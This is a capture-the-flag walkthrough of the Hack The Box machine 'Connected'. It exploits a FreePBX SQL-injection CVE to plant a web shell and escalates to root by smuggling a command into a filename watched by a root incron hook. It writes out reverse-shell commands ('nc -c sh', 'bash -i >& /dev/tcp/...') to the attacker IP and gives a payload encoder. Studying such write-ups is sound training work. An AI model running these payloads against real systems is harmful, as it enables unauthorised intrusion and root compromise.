# Hack The Box — Connected

Difficulty: Medium

OS: Linux

IP: 10.129.37.107

## 1. Reconnaissance

### Port Scan

Initial scan with `rustscan`:

```bash
rustscan -a 10.129.37.107 -- -sV -sC -oN nmap
```

Discovered ports:

```text
22/tcp    OpenSSH
80/tcp    HTTP
```

### Hostname Resolution

The web application was accessible using the hostname `connected.htb`. Added to `/etc/hosts`:

```bash
echo "10.129.37.107 connected.htb" >> /etc/hosts
```

## 2. Web Enumeration

Browsing to `http://connected.htb` revealed a FreePBX installation.

<img width="2558" height="1262" alt="Pasted image 20260905161851" src="https://github.com/user-attachments/assets/a3ea6596-6fce-4810-aa75-12d33641c87d" />

### Version Identification

From the bottom of the page, the installed version was identified as FreePBX 16.0.40.7.

This version is affected by CVE-2025-57819 — an unauthenticated SQL Injection vulnerability that can lead to Remote Code Execution.

## 3. Initial Access — CVE-2025-57819

### Vulnerability Summary

CVE-2025-57819 is an unauthenticated SQL Injection vulnerability in FreePBX versions prior to 16.0.41. It allows an attacker to inject malicious SQL into the `cron_jobs` table, which can be leveraged to deploy a web shell and achieve RCE as the `asterisk` user.

### Exploitation

A public exploit chain was used to achieve RCE:

https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819

1. SQL Injection to insert a malicious cron job
2. File upload capability to deploy a web shell
3. Command execution via the uploaded web shell

<img width="1025" height="307" alt="Pasted image 20260906101305" src="https://github.com/user-attachments/assets/526b83c3-f502-4315-8580-829e38623368" />

### Reverse Shell

With the web shell in place, a reverse shell was established:

```bash
curl "http://connected.htb/this-is-an-ioc-not-actually-watchTowr-qbkhaoiwbj.php?cmd=nc%20-c%20sh%2010.10.15.167%204444"
```

Listener (attacker machine):

```bash
nc -lvnp 4444
```

<img width="547" height="102" alt="Pasted image 20260906103804" src="https://github.com/user-attachments/assets/2ce8d8a9-b03f-4590-9387-806dc0240a24" />

Result — Shell as `asterisk` (`uid=999`) obtained.

Shell upgraded to interactive:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

## 4. Privilege Escalation — Discovering the incron Vector

### Step 1: Enumerating Running Processes

From the `asterisk` shell, `incrond` was identified as a root process.

<img width="701" height="18" alt="Pasted image 20260906112444" src="https://github.com/user-attachments/assets/e3f90064-8a8c-42fc-8b04-ef48117306a2" />

The incron configuration was then investigated to determine which directories were being monitored and which commands were executed.

### Step 2: LinPEAS Alert — incron Configuration

To automate local enumeration, LinPEAS was transferred and executed on the target:

```bash
# On attacker machine
python3 -m http.server 80

# On target (asterisk shell)
wget http://10.10.15.167/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

LinPEAS flagged an interesting incron configuration that warranted further investigation:

<img width="863" height="181" alt="Pasted image 20260906112433" src="https://github.com/user-attachments/assets/026d9730-eead-43bd-bf8d-37098887bf68" />

This immediately caught attention because:

* `incrond` runs as root
* A writable directory (`/var/spool/asterisk/incron/`) was being monitored
* Any file created or modified there would trigger `/usr/bin/sysadmin_manager` as root

### Step 3: Analyzing `sysadmin_manager`

The target script `/usr/bin/sysadmin_manager` was examined.

The script performs several security checks before executing a hook:

1. The request is parsed using the format `{module}.{hook}.{params}`
2. The corresponding `module.sig` file must exist
3. The module signature must be valid and signed by a whitelisted GPG key
4. The hook must be listed in the signature file
5. The SHA256 hash of the hook must match the signed hash
6. The parameters are checked for disallowed characters

### Step 4: Identifying the Hook Naming Convention

The filename parsing logic in `sysadmin_manager` revealed that the filename is interpreted using the following format:

```text
{module}.{hook}.{params}
```

The hook path is then constructed as:

```text
/var/www/html/admin/modules/{module}/hooks/{hook}
```

So the question became: Which module and hook should we use?

The `api.fwconsole-commands` prefix was confirmed as the trigger for this hook.

The relevant hook was located at:

```text
/var/www/html/admin/modules/api/hooks/fwconsole-commands
```

This gives us:

```text
api = module name
fwconsole-commands = hook name
```

Therefore, a filename following this format can be used:

```text
api.fwconsole-commands.{encoded_payload}
```

### Step 5: Analyzing the `fwconsole-commands` Hook

The hook file was examined:

```bash
cat /var/www/html/admin/modules/api/hooks/fwconsole-commands
```

```php
#!/usr/bin/php -q
<?php
error_reporting(E_ALL);
require '/usr/lib/sysadmin/includes.php';

$command = $argv[1];
$txn_id  = "";
if (isset($argv[1])) {
    // Underp the base64
    $b = str_replace('_', '/', $argv[1]);
    $settings = @json_decode(gzuncompress(@base64_decode($b)), true);
    if (is_array($settings)) {
        $command = $settings[0];
        $txn_id = $settings[1];
    }
}

try {
    $output = array();
    $cmd = "/usr/sbin/fwconsole $command 2>&1";
    $result = exec($cmd, $output, $return);
    // ...
}
?>
```

findings:

This hook receives the parameter (`$argv[1]`), which corresponds to the `{params}` part of the filename.

It decodes the parameter using:

```text
_ → /
Base64 decode
zlib decompress
JSON decode
```

The decoded JSON is:

```text
[command, transaction_id]
```

It then executes:

```text
/usr/sbin/fwconsole {command}
```

as root.

This is why we chose `api.fwconsole-commands`:

```text
api = module name (exists in /var/www/html/admin/modules/api/)

fwconsole-commands = hook name (exists in /var/www/html/admin/modules/api/hooks/)
```

### Step 6: Exploiting the incron Vector

Based on the decoding logic from `fwconsole-commands`, we created an encoder.

The payload was generated on the attacker host:

```bash
python3 -c '
import json, zlib, base64
cmd = "some;  bash -c \"bash -i >& /dev/tcp/10.10.15.167/4444 0>&1\"" # To bypass this limitation, we use a dummy command + ;
data = json.dumps([cmd, "txn"]).encode()
comp = zlib.compress(data)
enc = base64.b64encode(comp).decode().replace("/", "_")
print(enc)'
```

The resulting payload was:

```text
eJyLVirOz021VlBISizOUNBNVohRgrAyFezUFPRTUsv0S5IL9A0N9EDIVM_QzFzfBAgUDOzUDGOUlHQUlEoq8pRiAdj4Er8
```

Creating the trigger file:

```bash
touch "/var/spool/asterisk/incron/api.fwconsole-commands.eJyLVirOz021VlBISizOUNBNVohRgrAyFezUFPRTUsv0S5IL9A0N9EDIVM_QzFzfBAgUDOzUDGOUlHQUlEoq8pRiAdj4Er8"
```

The incron rule detected the newly created file and invoked the corresponding hook as root.

Receiving the root shell on the attacker machine:

<img width="742" height="767" alt="Pasted image 20260907071339" src="https://github.com/user-attachments/assets/3da6cf24-f05c-46cc-9c78-7cf3d5d8f24a" />

Root obtained.
